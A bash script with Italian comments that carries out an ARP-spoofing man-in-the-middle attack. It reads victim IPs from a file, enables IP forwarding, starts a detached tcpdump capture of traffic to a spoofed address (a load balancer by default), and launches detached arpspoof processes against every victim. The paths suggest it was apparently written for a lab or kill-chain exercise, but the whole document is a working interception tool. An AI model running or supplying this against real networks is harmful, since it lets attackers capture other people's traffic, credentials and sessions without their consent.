#!/usr/bin/env bash
set -euo pipefail

SPOOFED="${1:-${LOAD_BALANCER_IP:-172.18.0.200}}"
INPUT_FILE="${2:-${INPUT_FILE:-$DATA_PATH/KC2/iphost}}"
TCPDUMP_OUT="${3:-${TCPDUMP_OUT:-$DATA_PATH/KC2/node_traffic}}"
TCPDUMP_LOG="${4:-${TCPDUMP_LOG:-$DATA_PATH/KC2/tcpdump_stdout_err.log}}"
NAME="${5:-router}"
PIDFILE="${6:-$DATA_PATH/KC2/arp_pids}"

if [[ -z "${INPUT_FILE}" || ! -f "${INPUT_FILE}" ]]; then
  echo "File ips vuoto" >&2
  exit 1
fi

# Estrai tutti gli IP (prima colonna del file) e rimuovi duplicati
mapfile -t VICTIMS < <(awk -F' - ' -v NAME="$NAME" '$2 ~ NAME { print $1 }' "$INPUT_FILE" | sort -u)
if [[ "${#VICTIMS[@]}" -eq 0 ]]; then
  echo "Nessuna vittima trovata (HOST contenente $NAME). Procedo a predere tutta la rete." >&2
  mapfile -t VICTIMS < <(awk -F' - ' '{print $1}' "${INPUT_FILE}" | sort -u)
  if [[ "${#VICTIMS[@]}" -eq 0 ]]; then
    echo "ERRORE: nessun worker trovato." >&2
    exit 1
  fi
fi

# Interfaccia usata per raggiungere lo spoofed
IFACE="$(ip -o route get "${SPOOFED}" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="dev") {print $(i+1); exit}}')"
IFACE="${IFACE:-eth0}"

echo "[*] Spoofed       : ${SPOOFED}"
echo "[*] Victims       : ${VICTIMS[*]}"
echo "[*] Interfaccia   : ${IFACE}"

# Abilita IP forwarding per non interrompere il traffico
echo "[*] Abilito IPv4 forwarding"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

if pgrep -f "tcpdump .* ${SPOOFED}" >/dev/null 2>&1; then
  echo "[*] tcpdump sembra già in esecuzione per ${SPOOFED} (lo lascio stare)."
else
  echo "[*] Avvio tcpdump staccato: ${TCPDUMP_OUT}"
  # setsid + redirezione per staccarlo dalla shell (rimane attivo anche se chiudi la sessione)
  setsid tcpdump -i "${IFACE}" -n host "${SPOOFED}" -w "${TCPDUMP_OUT}" \
      >"${TCPDUMP_LOG}" 2>&1 < /dev/null &
  sleep 1
fi

# Avvia ARP spoof verso tutte le victims
#   -t <target> spoofed   → convince il target che lo spoofed ha il nostro MAC
PIDS=()

echo "[*] Avvio arpspoof verso i worker per spoofed ${SPOOFED}"
for NODE in "${VICTIMS[@]}"; do
  echo "    - worker ${NODE}"
  setsid arpspoof -i "${IFACE}" -t "${NODE}" "${SPOOFED}" >/dev/null 2>&1 < /dev/null &
  PIDS+=("$!")
done

for pid in "${PIDS[@]}"; do
  printf '%s\n' "$pid" >> "$PIDFILE"
done

echo
echo "[*] MITM attivo."
echo "    - pcap: ${TCPDUMP_OUT}"
echo "    - log tcpdump: ${TCPDUMP_LOG}"
echo
